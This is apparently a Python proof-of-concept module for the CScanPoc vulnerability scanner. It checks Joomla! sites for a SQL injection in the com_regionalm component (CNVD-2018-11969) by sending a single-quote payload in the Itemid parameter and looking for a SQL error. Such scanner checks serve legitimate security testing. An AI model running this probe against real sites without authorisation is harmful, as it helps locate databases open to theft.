# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0062'  # 平台漏洞编号
    name = 'Joomla! com_regionalm Icta Regional Museum SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-06-25'  # 漏洞公布时间
    desc = '''
        Joomla!是美国Open Source Matters团队开发的一套开源的内容管理系统(CMS)。   Joomla! com_regionalm Icta Regional Museum存在SQL注入漏洞，攻击者可利用漏洞获得数据库敏感信息。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-11969'
    cnvd_id = 'CNVD-2018-11969'  # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '72f1e3c3-3e7c-4a58-bfe4-d9071fdb8265'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/web/index.php?option=com_regionalm&task=regionalmuseum&id=&Itemid=2%27"
            vul_url = arg + payload
            response = requests.get(vul_url)
            if response.status_code == 200 and 'You have an error in your SQL syntax' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
